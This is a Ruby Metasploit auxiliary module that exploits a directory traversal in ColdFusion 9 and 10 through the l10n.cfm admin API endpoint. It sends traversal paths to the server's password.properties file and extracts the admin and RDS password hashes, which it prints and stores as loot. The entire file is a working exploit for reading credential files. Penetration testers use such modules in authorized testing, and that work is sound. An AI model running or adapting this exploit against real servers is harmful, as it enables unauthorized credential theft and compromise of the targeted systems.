##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => "ColdFusion 'password.properties' Hash Extraction",
			'Description'    => %q{
					This module uses a directory traversal vulnerability to extract information
				such as password, rdspassword, and "encrypted" properties. This module has been
				tested successfully on ColdFusion 9 and ColdFusion 10. Use actions to select the
				target ColdFusion version.
			},
			'References'     =>
				[
					[ 'OSVDB', '93114' ],
					[ 'EDB', '25305' ]
				],
			'Author'         =>
				[
					'HTP',
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'Actions'     =>
				[
					['ColdFusion10'],
					['ColdFusion9']
				],
			'DefaultAction' => 'ColdFusion10',
			'DisclosureDate' => "May 7 2013"  #The day we saw the subzero poc
		))

		register_options(
			[
				Opt::RPORT(8500),
				OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
			], self.class)
	end

	def peer
		"#{datastore['RHOST']}:#{datastore['RPORT']}"
	end

	def run
		filename = ""
		case action.name
			when 'ColdFusion10'
				filename = "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties"
			when 'ColdFusion9'
				filename = "../../../../../../../../../../../../../../../opt/coldfusion9/lib/password.properties"
		end

		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
			'encode_params' => false,
			'encode' => false,
			'vars_get' => {
				'attributes.id'            => 'it',
				'attributes.file'          => '../../administrator/mail/download.cfm',
				'filename'                 => filename,
				'attributes.locale'        => 'it',
				'attributes.var'           => 'it',
				'attributes.jscript'       => 'false',
				'attributes.type'          => 'text/html',
				'attributes.charset'       => 'UTF-8',
				'thisTag.executionmode'    => 'end',
				'thisTag.generatedContent' => 'htp'
			}
		})

		if res.nil?
			print_error("#{peer} - Unable to receive a response")
			return
		end

		rdspass   = res.body.scan(/^rdspassword=(.+)/).flatten[0] || ''
		password  = res.body.scan(/^password=(.+)/).flatten[0]    || ''
		encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0]   || ''

		if rdspass.empty? and password.empty?
			# No pass collected, no point to store anything
			print_error("#{peer} - No passwords found")
			return
		end

		print_good("#{peer} - rdspassword = #{rdspass}")
		print_good("#{peer} - password    = #{password}")
		print_good("#{peer} - encrypted   = #{encrypted}")

		p = store_loot('coldfusion.password.properties', 'text/plain', rhost, res.body)
		print_good("#{peer} - password.properties stored in '#{p}'")
	end

end